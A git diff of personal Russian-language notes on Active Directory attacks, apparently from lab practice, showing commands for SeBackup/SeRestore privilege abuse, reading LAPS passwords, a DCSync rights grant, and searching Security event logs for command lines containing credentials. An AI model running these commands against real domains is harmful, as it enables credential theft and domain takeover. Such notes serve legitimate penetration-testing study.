@@ -603,7 +603,7 @@ Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync
 
 # Группы в домене 
        
-    # SeBackup и SeRestore
+    ------------------ SeBackup и SeRestore
         Нужны DLL чтобы сделать enable эти права у пользователя
         Они есть в релизе к этому разделу
         https://github.com/giuliano108/SeBackupPrivilege
@@ -617,7 +617,7 @@ Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync
 
         и можем копировать что угодно
 
-    # LAPS (взлом)
+    ------------------- LAPS (взлом)
 
     если юзер входит в группу laps
 
@@ -641,3 +641,9 @@ Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync
   Find-AdmPwdExtendedRights -Identity * (THMorg)
   runas /netonly /user:bk-admin "cmd.exe"
   Get-AdmPwdPassword -ComputerName Creds-Harvestin
+
+      --------------------------Event Log Readers
+
+       wevtutil qe Security /rd:true /f:text | Select-String "/user"
+        Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+        
